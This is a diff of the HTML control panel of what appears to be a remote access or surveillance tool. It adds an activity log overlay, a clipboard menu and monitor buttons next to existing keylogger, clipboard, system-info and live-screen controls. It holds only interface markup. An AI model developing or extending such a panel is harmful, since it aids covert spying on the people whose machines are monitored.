@@ -85,6 +85,7 @@
         <span class="status-label" id="panelStatus">Connected</span>
         <span class="status-dot" id="panelDot"></span>
       </div>
+      <button class="sm-btn" onclick="openLog()" title="Activity Log">Log</button>
       <span class="version-tag" id="panelVersion">v1.0.0</span>
     </div>
 
@@ -114,7 +115,7 @@
           <div class="cmd-group-btns">
             <button class="cmd" onclick="execCmd('/ip')"><span class="ci">&#8853;</span>IP</button>
             <button class="cmd" onclick="execCmd('/sys')"><span class="ci">&#9776;</span>System</button>
-            <button class="cmd" onclick="execCmd('/clipboard')"><span class="ci">&#8801;</span>Clip</button>
+            <button class="cmd" onclick="clipboardMenu()"><span class="ci">&#8801;</span>Clip</button>
             <button class="cmd" onclick="openKeylog()"><span class="ci">&#9000;</span>Keys</button>
           </div>
         </div>
@@ -195,6 +196,7 @@
     <div class="overlay-header">
       <div class="overlay-title">Live Screen</div>
       <div class="live-meta" id="liveMeta">-- fps</div>
+      <div class="quality-btns" id="monBtns"></div>
       <div class="quality-btns">
         <button class="qb" data-q="low" onclick="setLiveQ('low')">L</button>
         <button class="qb active" data-q="med" onclick="setLiveQ('med')">M</button>
@@ -268,6 +270,17 @@
         <button class="btn-sec" onclick="closeUpdate()" style="flex:1">Close</button>
       </div>
     </div>
+  </div>
+
+  <!-- ===== ACTIVITY LOG ===== -->
+  <div id="logOverlay" class="overlay hidden">
+    <div class="overlay-header">
+      <div class="overlay-title">Activity Log</div>
+      <button class="sm-btn" onclick="downloadLog()">Save</button>
+      <button class="sm-btn" onclick="clearLog()">Clear</button>
+      <button class="close-btn" onclick="closeLog()">&#10005;</button>
+    </div>
+    <pre id="logOutput" class="log-output"></pre>
   </div>
 
   <!-- ===== LIGHTBOX ===== -->
